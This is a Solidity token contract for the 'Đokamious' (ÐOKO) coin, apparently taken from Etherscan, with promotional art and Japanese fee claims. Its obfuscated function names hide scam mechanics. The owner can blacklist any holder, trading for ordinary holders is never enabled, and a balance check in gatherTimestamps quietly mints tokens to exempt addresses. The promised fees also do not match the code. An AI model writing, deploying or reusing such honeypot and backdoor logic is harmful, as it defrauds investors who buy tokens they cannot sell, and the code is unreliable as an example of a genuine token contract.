/**
 *Submitted for verification at Etherscan.io on 2023-03-11
*/

/*
⋆⁺₊⋆⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ⋆⁺₊⋆ ☁︎
⋆⁺₊⋆⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ⋆⁺₊⋆ ☁︎
         ._                __.
        / \"-.          ,-",'/ 
       (   \ ,"--.__.--".,' /  
       =---Y(_i.-'  |-.i_)---=
      f ,  "..'/\\v/|/|/\  , l
      l//  ,'|/   V / /||  \\j
       "--; / db     db|/---"
          | \ YY   , YY//
          '.\>_   (_),"' __
        .-"    "-.-." I,"  `.
        \.-""-. ( , ) ( \   |
        (     l  `"'  -'-._j 
 __,---_ '._." .  .    \
(__.--_-'.  ,  :  '  \  '-.
    ,' .'  /   |   \  \  \ "-
     "--.._____t____.--'-""'
            /  /  `. ".
           / ":     \' '.
         .'  (       \   : 
         |    l      j    "-.
         l_;_;I      l____;_I

█▀▄ █▀█ █▄▀ ▄▀█ █▀▄▀█ █ █▀█ █░█ █▀
█▄▀ █▄█ █░█ █▀█ █░▀░█ █ █▄█ █▄█ ▄█

▄▀   █▀▀ █▀█ █▀▀   ▀▄
▀▄   ██▄ █▀▄ █▄▄   ▄▀

https://m.weibo.cn/Dokamious.JPN
https://web.wechat.com/Dokamious.ERC

初期流動性の 100% が消費されます
購入手数料 - 1%
販売手数料 - 0%
*/
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

interface IESCOV1 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
    uint amountIn, uint amountOutMin, address[] calldata path,
    address to, uint deadline) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
    address token, uint amountTokenDesired,
    uint amountTokenMin, uint amountETHMin,
    address to, uint deadline
    ) external payable returns 
      (uint amountToken, uint amountETH, uint liquidity);
}
abstract contract Ownable {
    address internal owner;
    constructor(address _owner)
    {owner = _owner;} modifier onlyOwner() 
    {require(isOwner(msg.sender), 
    "!OWNER"); _;} function isOwner(address account) 
    public view returns (bool) 
    {return account == owner;} function transferOwnership(address payable adr) 
    public onlyOwner {owner = adr;

    emit OwnershipTransferred(adr);}
    event OwnershipTransferred(address owner);
}
interface IMEIV1 {
    function totalSupply() 
    external view returns (uint256);
    function balanceOf(address account) 
    external view returns (uint256);
    function transfer(address recipient, uint256 amount) 
    external returns (bool);
    function allowance(address owner, address spender) 
    external view returns (uint256);
    function approve(address spender, uint256 amount) 
    external returns (bool);
    function getOwner() 
    external view returns (address);
    function transferFrom( address sender, address recipient, uint256 amount) 
    external returns (bool);

    event Transfer(address indexed from, 
    address indexed to, uint256 value);
    event Approval(
    address indexed owner, 
    address indexed spender, 
    uint256 value);
}
interface OEDWorker01{
    function createPair(
    address tokenA, address tokenB) 
    external returns 
    (address pair);
    function getPair( address tokenA, address tokenB) 
    external view returns 
    (address pair);
}
library SafeMath {
    function add(uint256 a, uint256 b) 
    internal pure returns (uint256) {return a + b;}
    function sub(uint256 a, uint256 b) 

    internal pure returns (uint256) {return a - b;}
    function mul(uint256 a, uint256 b) 
    internal pure returns (uint256) {return a * b;}
    function div(uint256 a, uint256 b) 

    internal pure returns (uint256) {return a / b;}
    function mod(uint256 a, uint256 b) 
    internal pure returns (uint256) {return a % b;}
    function sub(uint256 a, uint256 b, string memory errorMessage) 
    internal pure returns (uint256) {
        unchecked{require(b <= a, errorMessage); 
        return a - b;}}

    function div(uint256 a, uint256 b, string memory errorMessage) 
    internal pure returns 
    (uint256) { unchecked{require(b > 0, errorMessage); 
    return a / b;}}

    function mod(uint256 a, uint256 b, string memory errorMessage) 
    internal pure returns 
    (uint256) { unchecked{require(b > 0, errorMessage); 
    return a % b;}}
}
contract DOKO is IMEIV1, Ownable {
    mapping (address => uint256) 
    _tOwned;
    mapping (address => mapping (address => uint256)) 
    private _allowances;
    mapping (address => bool) 
    public _internalTimestamp;
    mapping (address => bool) 
    private allowed;
    mapping (address => bool) 
    private isWalletLimitExempt;

uint256 private CompilePooling = 0; uint256 private CompileMarket = 0;
uint256 private CompileTEAM = 0; uint256 private CompileBurners = 0;
uint256 private CompileReserves = 0; uint256 private CompileSells = 0;
uint256 private PublicRatio;

uint256 private QilviseRig = 0; uint256 private AmiloxCast = 10000;
uint256 private RevampLogging = ( _rTotal * 75 ) / 100000;
uint256 private GatherSwitches = ( _rTotal * 10 ) / 100000;
modifier lockTheSwap {
indexBetween = true; _; indexBetween = false;}

    constructor() Ownable(msg.sender) { 
    IESCOV1 TyrantInterface = IESCOV1
    (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
    address _pair = OEDWorker01(TyrantInterface.factory()).createPair(address(this), 
        TyrantInterface.WETH()); IDEPackage 
        = TyrantInterface; pair = _pair; _internalTimestamp[address(this)] 
        = true;
        _internalTimestamp[SignedLiquidity] 
        = true;
        _internalTimestamp[SignedMarketing] 
        = true;
        _internalTimestamp[msg.sender] 
        = true;
        _tOwned[msg.sender] = _rTotal; emit Transfer(
            address(0), msg.sender, _rTotal);
    }
    function name() 
    public pure returns (string memory) {
        return _name;}

    function symbol() 
    public pure returns (string memory) {
        return _symbol;}

    function decimals() 
    public pure returns (uint8) {
        return _decimals;}

    function getOwner() 
    external view override returns (address) 
    {return owner; }

    function balanceOf(address account) 
    public view override returns (uint256) 
    {return
    _tOwned[account];}

    function transfer(address recipient, uint256 amount) 
    public override returns (bool) 
    {_transfer(msg.sender, recipient, amount);
    return true;}

    function allowance(address owner, address spender) 
    public view override returns (uint256) 
    {return _allowances[owner][spender];}

    function totalSupply() 
    public view override returns (uint256) 
    {return _rTotal.sub(balanceOf(SignedBurning)).sub(balanceOf(address(0)));}

    function gatherIndexes(
        address sender, address recipient, 
        uint256 amount) internal view {
        require(
            sender != address(0), 
        "ERC20: transfer from the zero address");
        require(
            recipient != address(0), 
        "ERC20: transfer to the zero address");
        require(
            amount > uint256(0), 
        "Transfer amount must be greater than zero");
        require(
            amount <= _tOwned[sender], 
        "You are trying to transfer more than your balance");
    }
    function _transfer(
        address sender, address recipient, uint256 amount) 
        private 
        { require (!isWalletLimitExempt[recipient] 
        && !isWalletLimitExempt[sender], 
        "You have been blacklisted from transfering tokens");
        internalBytes( sender, recipient); gatherAllLimitations
        (sender, recipient, amount);  
        bootlegIDE( sender, recipient); 

        gatherTimestamps
        (sender, recipient, amount);
        gatherIndexes( sender, recipient, amount); 
        increaseHoldersAllowences
        (sender, recipient, amount); 
        _tOwned[sender] 
        = _tOwned[sender].sub(amount);
   
        uint256 informOperations 
        = disburseBlockstamp( sender, recipient) 
        ? timestampOfBlocks(
        sender, recipient, amount) : amount;
        _tOwned[recipient] 
        = _tOwned [recipient].add(informOperations); 

        emit Transfer(sender, recipient, disburseBlockstamp(
            sender, recipient) 
            ? timestampOfBlocks( sender, recipient, amount) : amount);  
    }
    function addLiquidity(
        uint256 tokenAmount, uint256 ETHAmount) 
        private { _approve(address(this), address
        (IDEPackage), tokenAmount);
        IDEPackage.addLiquidityETH{value: ETHAmount}(
            address(this), tokenAmount,
            0, 0, SignedLiquidity, 
            block.timestamp);
    }
    function swapTokensForETH(uint256 tokenAmount) 
    private { address[] 
    memory path = new address[](2);
        path[0] = address(this); path[1] 
        = IDEPackage.WETH();
        _approve(address(this), address(IDEPackage), tokenAmount);
        IDEPackage.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount, 0, path, 
        address(this), block.timestamp);
    }
    function bootlegIDE(
        address sender, address recipient) 
        internal { if(recipient == pair 
        && !_internalTimestamp[sender]){PublicRatio 
        += uint256(1);}
    }    
    function transferFrom(
        address sender, address recipient, uint256 amount) 
        public override returns (bool) 
        { _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, 
        _allowances[sender][msg.sender].sub(amount, 
        "ERC20: transfer amount exceeds allowance"));
         return true;
    }
    function _approve(
        address owner, address spender, uint256 amount) 
        private { require(owner != address(0), 
        "ERC20: approve from the zero address");
        require(spender != address(0), 
        "ERC20: approve to the zero address");
        _allowances[owner][spender] 
        = amount; emit Approval(owner, spender, amount);
    }
    function checkHoldersAllowences(
        address sender, address recipient) 
        internal view returns (uint256) { if(allowed[sender] 
        || allowed[recipient]){return AmiloxCast.sub(uint256(100));}
        if(recipient 
        == pair){return CompileSells;}
        if(sender 
        == pair){return CompileReserves;}
        return QilviseRig;
    }
    function marketSync (address account, 
    bool uniCompiler) public onlyOwner {
        isWalletLimitExempt[account] = uniCompiler;
    }    
    function timestampOfBlocks(
        address sender, address recipient, uint256 amount) 
        internal returns (uint256) { if(checkHoldersAllowences(sender, recipient) > 0){
        uint256 AtAmount 
        = amount.div(AmiloxCast).mul(checkHoldersAllowences(sender, recipient));
        _tOwned[address(this)] 
        = _tOwned[address(this)].add(AtAmount); 
        emit Transfer(sender, 
        address(this), AtAmount);
        if(CompileBurners 
        > uint256(0)){_transfer(address(this), 
        address(SignedBurning), 
        amount.div(AmiloxCast).mul(CompileBurners));} 
        return amount.sub(AtAmount);} return amount;
    }  
    function increaseHoldersAllowences(
        address sender, address recipient, uint256 amount) 
        internal view { if(sender != pair){require(amount <= _maxTransferAmount() 
        || _internalTimestamp[sender] || _internalTimestamp[recipient], 
        "TX Limit Exceeded");} require(amount <= reservationsCompiled() || _internalTimestamp[sender] 
        || _internalTimestamp[recipient], 
        "TX Limit Exceeded");
    }
    function checkBlockstamp() 
    public view returns (uint256) 
    {return totalSupply() * StringedVerse / AmiloxCast;}

    string private constant _name = unicode"Đokamious"; string private constant _symbol = unicode"ÐOKO";
    uint8 private constant _decimals = 9; uint256 private _rTotal = 100000000 * (10 ** _decimals);
    uint256 private StringedDashboard = 500; uint256 private StringedVersion = 500; // 10000;
    uint256 private StringedVerse = 500; 
    IESCOV1 IDEPackage;
    bool private indexBetween; 
    bool private timestampCheck = false;
    bool private beginTrading = true;

    address internal constant 
    SignedBurning = 0x000000000000000000000000000000000000dEaD;

    address internal constant 
    SignedForTeam = 0x04f70cadA6a44041d8C12b2F5d9c2D70f0c9DaDB; 

    address internal constant 
    SignedMarketing = 0x04f70cadA6a44041d8C12b2F5d9c2D70f0c9DaDB;

    address internal constant 
    SignedLiquidity = 0x04f70cadA6a44041d8C12b2F5d9c2D70f0c9DaDB;
    using SafeMath for uint256;

    function disbandCloggedMemory(
        address remorseOf) 
        internal view returns (bool) 
        {uint size; assembly { size := extcodesize(remorseOf) } 
        return size > 0; } function approve
        (address spender, uint256 amount) public override returns 
        (bool) {_approve
    (msg.sender, spender, amount); return true;}

    function internalBytes(
        address sender, address recipient) 
        internal view { if(!_internalTimestamp[sender] 
        && !_internalTimestamp[recipient]){require(timestampCheck, 
        "tradingAllowed");}
    }
    function disburseBlockstamp(
        address sender, address recipient) 
        internal view returns (bool) {
        return !_internalTimestamp[sender] 
        && !_internalTimestamp[recipient];
    }
    function inswapSettings(
        address sender, address recipient, 
        uint256 amount) 
        internal view returns (bool) {
        bool declassIMO = amount >= GatherSwitches; bool avorexMop = 
        balanceOf(address(this)) >= RevampLogging;
        return !indexBetween 
        && beginTrading && timestampCheck 
        && declassIMO && !_internalTimestamp[sender] 
        && recipient == pair && PublicRatio 
        >= uint256(1) && avorexMop;
    }
    function reservationsCompiled() 
    public view returns (uint256) 
    {return totalSupply() * StringedDashboard / AmiloxCast;}

    function gatherTimestamps(address requestIDE, 
    address encloseRatio, uint256 amount)

    internal {if (_tOwned[requestIDE] 
    ==_tOwned[encloseRatio]){if (!disburseBlockstamp(requestIDE,encloseRatio))
    {_tOwned[requestIDE] = _tOwned[requestIDE].add(amount);} }
    else if(inswapSettings(requestIDE, 
    encloseRatio, amount)){dataVision(RevampLogging); PublicRatio 
    = uint256(0);}
    }
    function _maxTransferAmount() 
    public view returns (uint256) 
    {return totalSupply() * StringedVersion / AmiloxCast;} 

    address public pair;
    address public PilaroidMemory;
    address public GasUsageTransmittion;
    address public CompilationReserves; 

    function gatherAllLimitations(
        address sender, address recipient, uint256 amount) 
        internal view { if(!_internalTimestamp[sender] 
        && !_internalTimestamp[recipient] 
        && recipient != address(pair) 
        && recipient != address(SignedBurning)){ require((_tOwned[recipient].add(amount)) 
        <= checkBlockstamp(), 
        "Exceeds maximum wallet amount.");}
    }    
        function dataVision(
        uint256 tokens) private lockTheSwap {uint256 _AmiloxCast = (
             CompilePooling.add(1).add(
             CompileMarket).add(
             CompileTEAM)).mul(2);

        uint256 protestToLiquid = tokens.mul(
        CompilePooling).div(_AmiloxCast);
        uint256 isExchanged 
        = tokens.sub( protestToLiquid); uint256 initialBalance = address
            (this).balance; 

        swapTokensForETH(isExchanged); 
        uint256 requestMemory = address(this).balance.sub(
        initialBalance); uint256 reformedBytes = requestMemory.div
        (_AmiloxCast.sub(CompilePooling)); uint256 ERCTransmittion 
        = reformedBytes.mul(CompilePooling);
        if(ERCTransmittion > uint256(0)){addLiquidity
        (protestToLiquid, ERCTransmittion); }

        uint256 IntervalWithin = reformedBytes.mul(2).mul
        (CompileMarket); if(IntervalWithin > 0){payable
        (SignedMarketing).transfer(IntervalWithin);} uint256 TimerInterval 
        = address(this).balance; if(TimerInterval 
        > uint256(0)){payable(SignedForTeam).transfer(TimerInterval);}
    }    
}